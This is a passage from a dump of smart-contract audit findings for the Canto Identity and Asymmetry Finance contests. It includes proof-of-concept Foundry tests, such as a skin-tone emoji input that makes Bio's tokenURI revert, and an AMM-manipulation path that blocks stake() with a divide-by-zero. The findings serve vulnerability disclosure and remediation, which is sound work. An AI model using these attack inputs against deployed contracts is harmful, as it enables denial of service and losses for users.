NoteAddressUpdate(currentNoteAddress, _newNoteAddress); } ```"}, {"title": "Bio lines will overflow the buffer for repeated \"continuation\" characters", "html_url": "https://github.com/code-423n4/2023-03-canto-identity-findings/issues/122", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-08"], "target": "2023-03-canto-identity-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-canto-identity/blob/main/canto-bio-protocol/src/Bio.sol#L60-L95   # Vulnerability details  ## Impact  The Bio `tokenURI` function splits biography text into lines. The algorithm will take into account certain \"continuation\" characters to prevent splitting the line in the middle of these characters and keep accumulating those in the current line buffer (`bytesLines`):  https://github.com/code-423n4/2023-03-canto-identity/blob/main/canto-bio-protocol/src/Bio.sol#L60-L95  ```solidity if ((i > 0 && (i + 1) % 40 == 0) || prevByteWasContinuation || i == lengthInBytes - 1) {     bytes1 nextCharacter;     if (i != lengthInBytes - 1) {         nextCharacter = bioTextBytes[i + 1];     }     if (nextCharacter & 0xC0 == 0x80) {         // Unicode continuation byte, top two bits are 10         prevByteWasContinuation = true;     } else {         // Do not split when the prev. or next character is a zero width joiner. Otherwise, \ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d\udc66 could become \ud83d\udc68>\u200d\ud83d\udc67\u200d\ud83d\udc66         // Furthermore, do not split when next character is skin tone modifier to avoid \ud83e\udd26\u200d\u2642\ufe0f\\n\ud83c\udffb         if (             // Note that we do not need to check i < lengthInBytes - 4, because we assume that it's a valid UTF8 string and these prefixes imply that another byte follows             (nextCharacter == 0xE2 && bioTextBytes[i + 2] == 0x80 && bioTextBytes[i + 3] == 0x8D) ||             (nextCharacter == 0xF0 &&                 bioTextBytes[i + 2] == 0x9F &&                 bioTextBytes[i + 3] == 0x8F &&                 uint8(bioTextBytes[i + 4]) >= 187 &&                 uint8(bioTextBytes[i + 4]) <= 191) ||             (i >= 2 &&                 bioTextBytes[i - 2] == 0xE2 &&                 bioTextBytes[i - 1] == 0x80 &&                 bioTextBytes[i] == 0x8D)         ) {             prevByteWasContinuation = true;             continue;         }         assembly {             mstore(bytesLines, bytesOffset)         }         strLines[insertedLines++] = string(bytesLines);         bytesLines = new bytes(80);         prevByteWasContinuation = false;         bytesOffset = 0;     } } ```  However, if the unicode string is a sequence of these continuation characters (which is a valid UTF8 string) the line buffer (which is 80 bytes) will eventually overflow and will revert the transaction due to an index of out bounds exception.  ## Proof of Concept  In the following test we use a string with 21 [U+1F3FE](https://unicodeplus.com/U+1F3FE) characters to overflow the line buffer and revert the query to `tokenURI`.  Note: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/5ca5fdfb2a1239cde80ea1c5a7f5eec9).  ```solidity function test_Bio_tokenURI_LineBufferOverflow() public {     // This is a skin tone codepoint (\"f09f8fbe\") repeated 21 times     string memory text = unicode\"\ud83c\udffe\ud83c\udffe\ud83c\udffe\ud83c\udffe\ud83c\udffe\ud83c\udffe\ud83c\udffe\ud83c\udffe\ud83c\udffe\ud83c\udffe\ud83c\udffe\ud83c\udffe\ud83c\udffe\ud83c\udffe\ud83c\udffe\ud83c\udffe\ud83c\udffe\ud83c\udffe\ud83c\udffe\ud83c\udffe\ud83c\udffe\";     bio.mint(string(text));     vm.expectRevert();     bio.tokenURI(1); } ```  ## Recommendation  Change to a new line when the current line buffer is full.  "}, {"title": "Users will be able to purchase fewer NFTs than the project had anticipated", "html_url": "https://github.com/code-423n4/2023-03-canto-identity-findings/issues/117", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "edited-by-warden", "H-01"], "target": "2023-03-canto-identity-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-canto-identity/blob/077372297fc419ea7688ab62cc3fd4e8f4e24e66/canto-namespace-protocol/src/Namespace.sol#L144   # Vulnerability details  ## Impact Detailed description of the impact of this finding. Users will be able to purchase fewer NFTs than the project had anticipated. The project had expected that users would be able to purchase a range of variations using both text and emoji characters. However, in reality, users will only be able to purchase a range of variations using emoji characters.  For example, the list of characters available for users to choose from is as follows ![image](https://i.ibb.co/NjnD4Tf/Screenshot-from-2023-03-20-00-22-32.png)  For instance, if a user chooses to mint an NFT namespace using font class 2 and the single letter \ud835\udcb6, then theoretically all other users should be able to mint font class 0 using the first emoji in the list, font class 1 using the single letter \"a,\" font class 3 using the single letter \ud835\udcea, and so on, the first letter on every class will be. However, in reality, they will not be able to do so.  I consider this to be a critical issue because the project may not be able to sell as many NFTs as expected, potentially resulting in a loss of funds.  Here is an how nft name and their svg will look like from what I described above. As you can see emojie replaced letters in the name.  ![iamge](https://i.ibb.co/L8NDWgy/Screenshot-from-2023-03-20-17-35-49.png)  This is a function that creates namespace out of tray. ```solidity canto-namespace-protocol/src/Namespace.sol#L110     function fuse(CharacterData[] calldata _characterList) external {         uint256 numCharacters = _characterList.length;         if (numCharacters > 13 || numCharacters == 0) revert InvalidNumberOfCharacters(numCharacters);         uint256 fusingCosts = 2**(13 - numCharacters) * 1e18;         SafeTransferLib.safeTransferFrom(note, msg.sender, revenueAddress, fusingCosts);         uint256 namespaceIDToMint = ++nextNamespaceIDToMint;         Tray.TileData[] storage nftToMintCharacters = nftCharacters[namespaceIDToMint];         bytes memory bName = new bytes(numCharacters * 33); // Used to convert into a string. Can be 33 times longer than the string at most (longest zalgo characters is 33 bytes)         uint256 numBytes;         // Extract unique trays for burning them later on         uint256 numUniqueTrays;         uint256[] memory uniqueTrays = new uint256[](_characterList.length);         for (uint256 i; i < numCharacters; ++i) {             bool isLastTrayEntry = true;             uint256 trayID = _characterList[i].trayID;             uint8 tileOffset = _characterList[i].tileOffset;             // Check for duplicate characters in the provided list. 1/2 * n^2 loop iterations, but n is bounded to 13 and we do not perform any storage operations             for (uint256 j = i + 1; j < numCharacters; ++j) {                 if (_characterList[j].trayID == trayID) {                     isLastTrayEntry = false;                     if (_characterList[j].tileOffset == tileOffset) revert FusingDuplicateCharactersNotAllowed();                 }             }             Tray.TileData memory tileData = tray.getTile(trayID, tileOffset); // Will revert if tileOffset is too high             uint8 characterModifier = tileData.characterModifier;              if (tileData.fontClass != 0 && _characterList[i].skinToneModifier != 0) {                 revert CannotFuseCharacterWithSkinTone();             }                          if (tileData.fontClass == 0) {                 // Emoji                 characterModifier = _characterList[i].skinToneModifier;             }             bytes memory charAsBytes = Utils.characterToUnicodeBytes(0, tileData.characterIndex, characterModifier); ...  ``` [canto-namespace-protocol/src/Namespace.sol#L110](https://github.com/code-423n4/2023-03-canto-identity/blob/077372297fc419ea7688ab62cc3fd4e8f4e24e66/canto-namespace-protocol/src/Namespace.sol#L110)  There is a bug in this line of code where a character is retrieved from tile data. Instead of passing `tileData.fontClass`, we are passing `0`.   ```solidity             bytes memory charAsBytes = Utils.characterToUnicodeBytes(0, tileData.characterIndex, characterModifier); ``` Due to this bug, the names for all four different font classes will be the same. As a result, they will point to an existing namespace, and later, there will be a check for the existence of that name (token) using NameAlreadyRegistered.  ```solidity         string memory nameToRegister = string(bName);         uint256 currentRegisteredID = nameToToken[nameToRegister];         if (currentRegisteredID != 0) revert NameAlreadyRegistered(currentRegisteredID); ```  ## Proof of Concept Here is the test that you can run ```solidity     function testFailMintSameCharacterIndex() public {         address user = user1;         note.mint(user, 10000e18);         endPrelaunchAndBuyOne(user);          uint256[] memory trayIds = buyTray(user, 3);         vm.startPrank(user);         note.approve(address(ns), type(uint256).max);         Namespace.CharacterData[] memory list = new Namespace.CharacterData[](             1         ); //      fuse tile with fontClass=8,characterIndex=1         list[0] = Namespace.CharacterData(trayIds[1], 4, 0);         Tray.TileData memory tileData = tray.getTile(trayIds[1], 4);         console.log(tileData.characterIndex);//1         console.log(tileData.fontClass);//8         ns.fuse(list);  //      fuse tile with fontClass=4,characterIndex=1         list[0] = Namespace.CharacterData(trayIds[2], 3, 0);         tileData = tray.getTile(trayIds[2], 3);         console.log(tileData.characterIndex);//1         console.log(tileData.fontClass);//4         vm.expectRevert(             abi.encodeWithSelector(Namespace.NameAlreadyRegistered.selector, 1)         );         ns.fuse(list);     } ``` ## Tools Used Manual review, forge tests ## Recommended Mitigation Steps Pass font class instead of 0 ```diff -            bytes memory charAsBytes = Utils.characterToUnicodeBytes(0, tileData.characterIndex, characterModifier); +            bytes memory charAsBytes = Utils.characterToUnicodeBytes(tileData.fontClass, tileData.characterIndex, characterModifier); ```  "}, {"title": "Bio NFT incorrectly breaks SVG lines and doesn't support more than 120 characters effectively", "html_url": "https://github.com/code-423n4/2023-03-canto-identity-findings/issues/59", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-09"], "target": "2023-03-canto-identity-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-canto-identity/blob/077372297fc419ea7688ab62cc3fd4e8f4e24e66/canto-bio-protocol/src/Bio.sol#L43   # Vulnerability details  ## Impact Bio NFT incorrectly breaks SVG lines and doesn't support more than 120 characters effectively.  ## Proof of Concept According to the docs > Any user can mint a Bio NFT by calling Bio.mint and passing his biography. It needs to be shorter than 200 characters.  Let's take two strings and pass them to create an NFT. The first one is 200 characters long, and the second one is 120 characters long. `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaWaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaWaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaWaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaWaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaW` `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaWaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaWaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaW`  This is how they will look like. As you can see they look identical. ![image](https://i.ibb.co/Cvw62Rz/Screenshot-from-2023-03-19-12-20-26.png)  Next, lets take this text for which we create nft. I took it from a test and double. `012345678901234567890123456789012345678\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc67012345678901234567890123456789012345678\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc67\u200d\ud83d\udc67`  Here is on the left how it looks now vs how it suppose to be. As you can you line breaking doesn't work. I did enlarge viewBox so you can see the difference.  ![image](https://i.ibb.co/XDNxLWx/Screenshot-from-2023-03-19-12-28-42.png)  The problem is in this part of the code, where `(i > 0 && (i + 1) % 40 == 0)` doesn't handle properly because you want to include emojis, so length will be more than 40 (`40 + length(emoji)`) ```solidity canto-bio-protocol/src/Bio.sol#L56         for (uint i; i < lengthInBytes; ++i) {             bytes1 character = bioTextBytes[i];             bytesLines[bytesOffset] = character;             bytesOffset++;             if ((i > 0 && (i + 1) % 40 == 0) || prevByteWasContinuation || i == lengthInBytes - 1) {                 bytes1 nextCharacter; ``` [canto-bio-protocol/src/Bio.sol#L56](https://github.com/code-423n4/2023-03-canto-identity/blob/077372297fc419ea7688ab62cc3fd4e8f4e24e66/canto-bio-protocol/src/Bio.sol#L56) Lastly, the NFT doesn't center-align text, but I believe it should. I took text from a test and on the left is how it currently appears, while on the right is how I think it should be.  ![image](https://i.ibb.co/8r1jMhc/Screenshot-from-2023-03-18-13-43-21.png)  Here is the code. dy doesn't apply correctly; it should be 0 for the first line. ```solidity  canto-bio-protocol/src/Bio.sol#L104         for (uint i; i < lines; ++i) {             text = string.concat(text, '<tspan x=\"50%\" dy=\"20\">', strLines[i], \"</tspan>\");         } ``` [canto-bio-protocol/src/Bio.sol#L104](https://github.com/code-423n4/2023-03-canto-identity/blob/077372297fc419ea7688ab62cc3fd4e8f4e24e66/canto-bio-protocol/src/Bio.sol#L104) ## Tools Used Manual review ## Recommended Mitigation Steps Enlarge viewBox so it will support 200 length or restrict to 120 characters. Here is a complete code with correct line breaking and center text. I'm sorry that I didn't add `differ` to code because there will be too many lines. It does pass tests and fix current issues ```solidity     function tokenURI(uint256 _id) public view override returns (string memory) {         if (_ownerOf[_id] == address(0)) revert TokenNotMinted(_id);         string memory bioText = bio[_id];         bytes memory bioTextBytes = bytes(bioText);         uint lengthInBytes = bioTextBytes.length;         // Insert a new line after 40 characters, taking into account unicode character         uint lines = (lengthInBytes - 1) / 40 + 1;         string[] memory strLines = new string[](lines);         bool prevByteWasContinuation;         uint256 insertedLines;         // Because we do not split on zero-width joiners, line in bytes can technically be much longer. Will be shortened to the needed length afterwards         bytes memory bytesLines = new bytes(80);         uint bytesOffset;         uint j;         for (uint i; i < lengthInBytes; ++i) {             bytesLines[bytesOffset] = bytes1(bioTextBytes[i]);             bytesOffset++;             j+=1;             if ((j>=40) || prevByteWasContinuation || i == lengthInBytes - 1) {                 bytes1 nextCharacter;                 if (i != lengthInBytes - 1) {                     nextCharacter = bioTextBytes[i + 1];                 }                 if (nextCharacter & 0xC0 == 0x80) {                     // Unicode continuation byte, top two bits are 10                     prevByteWasContinuation = true;                     continue;                 } else {                     // Do not split when the prev. or next character is a zero width joiner. Otherwise, \ud83d\udc68\u200d\ud83d\udc67\u200d\ud83d\udc66 could become \ud83d\udc68>\u200d\ud83d\udc67\u200d\ud83d\udc66                     // Furthermore, do not split when next character is skin tone modifier to avoid \ud83e\udd26\u200d\u2642\ufe0f\\n\ud83c\udffb                     if (                         // Note that we do not need to check i < lengthInBytes - 4, because we assume that it's a valid UTF8 string and these prefixes imply that another byte follows                         (nextCharacter == 0xE2 && bioTextBytes[i + 2] == 0x80 && bioTextBytes[i + 3] == 0x8D) ||                         (nextCharacter == 0xF0 &&                             bioTextBytes[i + 2] == 0x9F &&                             bioTextBytes[i + 3] == 0x8F &&                             uint8(bioTextBytes[i + 4]) >= 187 &&                             uint8(bioTextBytes[i + 4]) <= 191) ||                         (i >= 2 &&                             bioTextBytes[i - 2] == 0xE2 &&                             bioTextBytes[i - 1] == 0x80 &&                             bioTextBytes[i] == 0x8D)                     ) {                         prevByteWasContinuation = true;                         continue;                     }                 }                  assembly {                     mstore(bytesLines, bytesOffset)                 }                 strLines[insertedLines++] = string(bytesLines);                 bytesLines = new bytes(80);                 prevByteWasContinuation = false;                 bytesOffset = 0;                 j=0;             }         }         string             memory svg = '<svg xmlns=\"http://www.w3.org/2000/svg\" preserveAspectRatio=\"xMinYMin meet\" viewBox=\"0 0 400 100\"><style>text { font-family: sans-serif; font-size: 12px; }</style>';         string memory text = '<text x=\"50%\" y=\"50%\" dominant-baseline=\"middle\" text-anchor=\"middle\">';         text = string.concat(text, '<tspan x=\"50%\" dy=\"0\">', strLines[0], \"</tspan>\");// center first line and than add dy         for (uint i=1; i < lines; ++i) {             text = string.concat(text, '<tspan x=\"50%\" dy=\"20\">', strLines[i], \"</tspan>\");         }         string memory json = Base64.encode(             bytes(                 string.concat(                     '{\"name\": \"Bio #',                     LibString.toString(_id),                     '\", \"description\": \"',                     bioText,                     '\", \"image\": \"data:image/svg+xml;base64,',                     Base64.encode(bytes(string.concat(svg, text, \"</text></svg>\"))),                     '\"}'                 )             )         );         return string(abi.encodePacked(\"data:application/json;base64,\", json));     }  ``` "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1143", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-01"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/ArbitraryExecution-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1122", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-04"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/alexzoid-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1118", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-05"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/0xhacksmithh-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1109", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-08"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/c3phas-Q.md)."}, {"title": "Unintentionally Locked Ether in the Contract", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1104", "labels": ["bug", "downgraded by judge", "grade-a", "high quality report", "partial-50", "QA (Quality Assurance)", "sponsor confirmed", "duplicate-1027"], "target": "2023-03-asymmetry-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L246   # Vulnerability details  ### Impact  If a user accidentally sends Ether directly to the contract's `receive() payable` function instead of the intended `stake() payable` function, their funds will become locked and inaccessible, resulting in a loss of funds.  ### Proof of Concept  Testing this scenario in Foundry with command: `forge test -vv --match-test testFailEtherLockedOnReceive`. The test checks if Ether becomes locked in the `SafEth` contract when transferring Ether directly to the `receive() payable` function. ```solidity // SPDX-License-Identifier: MIT pragma solidity 0.8.13;  import \"ds-test/test.sol\"; import \"./cheatcodes.sol\"; // CheatCodes interface from https://book.getfoundry.sh/cheatcodes/ import \"../../contracts/SafEth/SafEth.sol\"; import \"../../contracts/SafEth/derivatives/Reth.sol\"; import \"../../contracts/SafEth/derivatives/SfrxEth.sol\"; import \"../../contracts/SafEth/derivatives/WstEth.sol\"; import \"../../contracts/interfaces/IDerivative.sol\"; import \"@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol\";  contract SafEthTest is Test {     uint256 private constant DEFAULT_MAX_SLIPPAGE = 1e16; // 1%     uint256 private constant DEFAULT_DERIVATIVE_WEIGHT = 1e18;     uint256 private TEST_DEPOSIT_WEI = 1 ether;     CheatCodes private cheats;     address private admin;     SafEth private safEth;     Reth private reth;     SfrxEth private sfrxEth;     WstEth private wstEth;     mapping(uint256 => IDerivative) private derivatives;      // Can receive unstaked Ether     receive() external payable {}      function setUp() public {         // Test on mainnet fork         cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);         cheats.createSelectFork(\"mainnet\");         // Set proxy owner address         admin = vm.addr(1337);          // safEth token deploy         safEth = SafEth(             payable(                 new TransparentUpgradeableProxy(                     address(new SafEth()),                     admin,                     abi.encodeWithSelector(                         SafEth.initialize.selector,                         \"Asymmetry Finance ETH\",                         \"safETH\"                     )                 )             )         );            // RocketPool derivative deploy and configue         reth = Reth(             payable(                 new TransparentUpgradeableProxy(                     address(new Reth()),                     admin,                     abi.encodeWithSelector(                         Reth.initialize.selector,                         address(safEth)                     )                 )             )         );           safEth.addDerivative(address(reth), DEFAULT_DERIVATIVE_WEIGHT);         safEth.setMaxSlippage(0, DEFAULT_MAX_SLIPPAGE);          derivatives[0] = IDerivative(reth);          // Frax derivative deploy and configue         sfrxEth = SfrxEth(             payable(                 new TransparentUpgradeableProxy(                     address(new SfrxEth()),                     admin,                     abi.encodeWithSelector(                         SfrxEth.initialize.selector,                         address(safEth)                     )                 )             )         );           safEth.addDerivative(address(sfrxEth), DEFAULT_DERIVATIVE_WEIGHT);         safEth.setMaxSlippage(1, DEFAULT_MAX_SLIPPAGE);         derivatives[1] = IDerivative(sfrxEth);          // Lido derivative deploy and configue         wstEth = WstEth(             payable(                 new TransparentUpgradeableProxy(                     address(new WstEth()),                     admin,                     abi.encodeWithSelector(                         WstEth.initialize.selector,                         address(safEth)                     )                 )             )         );           safEth.addDerivative(address(wstEth), DEFAULT_DERIVATIVE_WEIGHT);         safEth.setMaxSlippage(2, DEFAULT_MAX_SLIPPAGE);          derivatives[2] = IDerivative(wstEth);     }      function testFailEtherLockedOnReceive() public {         // Add Ether to the current contract's balance         vm.deal(address(this), TEST_DEPOSIT_WEI);         // Send Ether directly to the safEth contract         (bool sent, ) = address(safEth).call{value: TEST_DEPOSIT_WEI}(\"\");         assertTrue(sent);          // Verify that no safEth tokens were minted in response to the Ether deposit         assertTrue(safEth.balanceOf(address(this)) != 0, \"No safEth minted, ether locked\");          // The test should fail at this point, indicating that Ether is locked in the safEth contract     } } ```  The result will be a passed test with an error message `No safEth minted, ether locked`: ``` Running 1 test for test/foundry/SafEth.t.sol:SafEthTest [PASS] testFailEtherLockedOnReceive() (gas: 38917) Logs:   Error: No safEth minted, ether locked   Error: Assertion Failed  Test result: ok. 1 passed; 0 failed; finished in 4.48s ```  ### Tools Used  VSCodium, Foundry  ### Recommended Mitigation Steps  Implement a `receive() payable` function in `SafEth.sol` that accepts Ether only from registered derivatives. Example: ```solidity receive() external payable {     // Initialize a flag to track if the Ether sender is a registered derivative     bool acceptSender;      // Loop through the registered derivatives     uint256 count = derivativeCount;     for (uint256 i; i < count; ++i) {          acceptSender = (address(derivatives[i]) == msg.sender);         if(acceptSender) {             break;         }     }      // Require that the sender is a registered derivative to accept the Ether transfer     require(acceptSender, \"Not a derivative contract\"); }  ```  Since the `receive()` function only accepts transfers from registered derivative contracts, the user's transfer would be rejected and their funds would not be locked in the contract."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1100", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-05"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/c3phas-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1073", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-14"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/favelanky-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1072", "labels": ["bug", "G (Gas Optimization)", "grade-a", "high quality report", "sponsor confirmed", "G-07"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/0xSmartContract-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1059", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-15"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/m_Rassska-Q.md)."}, {"title": "potential stake() DoS if sole safETH holder (ie: first depositor) unstakes totalSupply - 1", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1016", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "primary issue", "selected for report", "sponsor confirmed", "M-03"], "target": "2023-03-asymmetry-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L68-L81 https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L98   # Vulnerability details  ## Impact Potential inability to stake (ie: DoS) if sole safETH user (ie: this would also make them the sole safETH holder) unstakes `totalSupply - 1`.  ## Proof of Concept The goal of this POC is to prove that this line can revert https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L98 ```         uint256 mintAmount = (totalStakeValueEth * 10 ** 18) / preDepositPrice; ``` This can occur if the attacker can cause `preDepositPrice = 0`.  A user who is the first staker will be the sole holder of 100% of `totalSupply` of safETH. They can then unstake (and therefore burn) `totalSupply - 1` leaving a total of 1 wei of safETH in circulation.  In earlier lines in `stake()` https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L77-L81, we see  ```         uint256 totalSupply = totalSupply();         uint256 preDepositPrice; // Price of safETH in regards to ETH         if (totalSupply == 0)             preDepositPrice = 10 ** 18; // initializes with a price of 1         else preDepositPrice = (10 ** 18 * underlyingValue) / totalSupply; ``` With `totalSupply = 1`, we see that the above code block will execute the `else` code path, and that if `underlyingValue = 0`, then `preDepositPrice = 0`.  `underlyingValue` is set in earlier lines: https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L68-L75 ```         uint256 underlyingValue = 0;          // Getting underlying value in terms of ETH for each derivative         for (uint i = 0; i < derivativeCount; i++)             underlyingValue +=                 (derivatives[i].ethPerDerivative(derivatives[i].balance()) *                     derivatives[i].balance()) /                 10 ** 18; ```  For a simple case, assume there is 1 derivative with 100% weight. Let's use rETH for this example since the derivative can get its `ethPerDerivative` price from an AMM. In this case: - Assume the `ethPerDerivative()` value has been manipulated in the underlying AMM pool such that 1 derivative ETH is worth less than 1 ETH. eg: 1 rETH = 9.99...9e17 ETH - In this case, also assume that since there is 1 wei of safETH circulating, there should be 1 wei of ETH staked through the protocol, and therefore `derivatives[i].balance() = 1 wei`.  This case will result in `underlyingValue += (9.99...9e17 * 1) / 10 ** 18 = 0`.  We can see that it is therefore possible to cause a divide by 0 revert and malfunction of the `stake()` function.  ## Tools Used Manual Review  ## Recommended Mitigation Steps Assuming the deployment process will set up at least 1 derivative with a weight, simply adding a `stake()`  operation of 0.5 ETH as the first depositor as part of the deployment process avoids the case where safETH totalSupply drops to 1 wei. Otherwise, within `unstake()` it is also possible to require that `totalSupply` does not fall between 0 and `minimumSupply` where `minimumSupply` is, for example, the configured `minAmount`."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1008", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-19"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/CodingNameKiki-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1006", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-20"], "target": "2023-03-asymmetry-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-asymmetry-findings/blob/main/data/tnevler-Q.md)."}, {"title": "A temporary issue shows in the staking functionality which leads to the users receiving less minted tokens.", "html_url": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1004", "labels": ["bug", "3 (High Risk)", "high quality report", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "H-02"], "target": "2023-03-asymmetry-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L63-L101 https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L156-L204 https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L211-L216   # Vulnerability details  ## Derivative Reth prices  A quick explanation of the issue causing it, the problem is based on the function \"ethPerDerivative\" in the Reth derivative. As you can see two statements can be triggered here, the first one \"if (poolCanDeposit(_amount))\" checks if the given amount + the pool balance isn't greater than the maximumDepositPoolSize and that the amount is greater than the minimum deposit in the pool. Second statement is meant to return a poolPrice which is slightly more than the regular one, because it's used in order to swap tokens in Uniswap and therefore the price per token is overpriced.  ```solidity function ethPerDerivative(uint256 _amount) public view returns (uint256) {         if (poolCanDeposit(_amount))             return                 RocketTokenRETHInterface(rethAddress()).getEthValue(10 ** 18);         else return (poolPrice() * 10 ** 18) / (10 ** 18);     } ``` ``` solidity // poolCanDeposit() returns:       return             rocketDepositPool.getBalance() + _amount <=             rocketDAOProtocolSettingsDeposit.getMaximumDepositPoolSize() &&             _amount >= rocketDAOProtocolSettingsDeposit.getMinimumDeposit(); ```  Below you can see the regular price returned in the first statement - 1063960369075232250:   <img width=\"417\" alt=\"Screenshot 2023-03-27 at 8 53 34\" src=\"https://user-images.githubusercontent.com/112419701/227852484-9bf0144d-820d-414c-8cb9-e1fb44f5c806.png\">  Below you can see the pool price from the second statement, supposed to be used only when a swap is made.  ```solidity else return (poolPrice() * 10 ** 18) / (10 ** 18);  // poolPrice calculates and returns uint160 sqrtPriceX96, , , , , , ) = pool.slot0();         return (sqrtPriceX96 * (uint(sqrtPriceX96)) * (1e18)) >> (96 * 2);  // uint160 sqrtPriceX96 = 81935751724326368909606241317 // return (sqrtPriceX96 * (uint(sqrtPriceX96)) * (1e18)) >> (96 * 2); // return 1069517062752670179 (pool price)  // The function \"ethPerDerivative\" for the else statement return (poolPrice() * 10 ** 18) / (10 ** 18); // Which will be - 1069517062752670179 ```  Difference between the regular price and the pool price:  ``` regular price - 1063960369075232250 pool price -    1069517062752670179 ```  ## Quick Overview  What can result to users receiving less minted tokens?  The first thing the staking function does is calculating the derivative underlyingValue. This issue occurs on the Reth derivative, as we can see the staking function calls \"ethPerDerivative\" to get the price, but takes as account the whole Reth balance of the derivative contract.   For example let's say the derivative Reth holds 200e18. The pool has free space for 100e18 more till it reaches its maximum pool size. As the function calls ethPerDerivative with the Reth balance of 200e18 instead of the amount being staked. The contract will think there is no more space in the pool (even tho there is 100e18 more) and will return the pool price which is overpriced and meant for the swap in Uniswap.  ```solidity underlyingValue +=                 (derivatives[i].ethPerDerivative(derivatives[i].balance()) *                     derivatives[i].balance()) /                 10 ** 18;  ``` ```solidity function ethPerDerivative(uint256 _amount) 